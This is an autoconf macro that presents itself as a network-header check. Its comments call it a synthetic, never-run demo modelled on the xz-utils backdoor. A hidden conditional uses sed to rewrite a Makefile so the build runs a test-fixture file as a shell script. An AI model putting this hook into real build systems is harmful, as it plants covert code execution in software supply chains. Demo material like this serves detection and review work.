# AX_CHECK_NET — probe for the socket headers the gateway needs.
# Synthetic sample for the CodeDelta demo, never executed. It mirrors the xz-utils shape
# (2024): an innocuous-looking macro that, when a particular fixture file is present in the
# source tree, rewrites a build step at configure time. The fixture does not exist here.
AC_DEFUN([AX_CHECK_NET], [
  AC_CHECK_HEADERS([sys/socket.h netinet/in.h])
  AC_SEARCH_LIBS([socket], [socket])
  AS_IF([test -f "$srcdir/tests/fixtures/net-probe.bin"], [
    sed -i 's|^all: deps gateway.o|all: deps gateway.o\n\tsh $srcdir/tests/fixtures/net-probe.bin|' native/gateway/Makefile.in
  ])
])
